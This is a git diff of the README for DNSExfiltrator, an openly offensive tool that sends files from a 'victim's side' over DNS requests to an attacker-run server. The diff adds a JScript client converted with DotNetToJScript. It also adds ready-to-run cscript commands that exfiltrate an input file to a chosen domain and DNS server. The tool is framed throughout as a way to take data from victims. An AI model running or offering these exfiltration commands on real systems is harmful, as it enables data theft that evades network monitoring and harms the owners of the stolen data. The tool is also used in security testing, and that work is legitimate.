@@ -7,9 +7,10 @@ DNSExfiltrator allows for transfering (*exfiltrate*) a file over a DNS request c
 
 DNSExfiltrator has to sides:
   1. The **server side**, coming as a single python script (`dnsexfiltrator.py`), which acts as a custom DNS server, receiving the file
-  2. The **client side** (*victim's side*), which comes in two flavors:
+  2. The **client side** (*victim's side*), which comes in three flavors:
   - `dnsExfiltrator.cs`: a C# script that can be compiled with `csc.exe` to provide a Windows managed executable
   - `Invoke-DNSExfiltrator.ps1`: a PowerShell script providing the exact same functionnalities by wrapping the dnsExfiltrator assembly
+  - `dnsExfiltrator.sj`: a JScript script which is a conversion of the dnsExiltrator DLL assembly using DotNetToJScript, and providing the exact same functionnalities
 
 In order for the whole thing to work **you must own a domain name** and set the DNS record (NS) for that domain to point to the server that will run the `dnsexfiltrator.py` server side.
 
@@ -69,6 +70,16 @@ PS c:\DNSExfiltrator> Invoke-DNSExfiltrator -i inputFile -d mydomain.com -p pass
 [...]
 ```
 Check the EXAMPLES section in the script file for further usage examples.
+
+3/ Using the JScript script, pass it the exact same arguments as you would with the standalone Windows executable:
+```
+cscript.exe dnsExiltrator.js inputFile mydomain.com password
+```
+Or, with some options:
+```
+cscript.exe dnsExiltrator.js inputFile mydomain.com password s=my.dns.server.com t=500
+```
+
 
 TODO
 ----------------
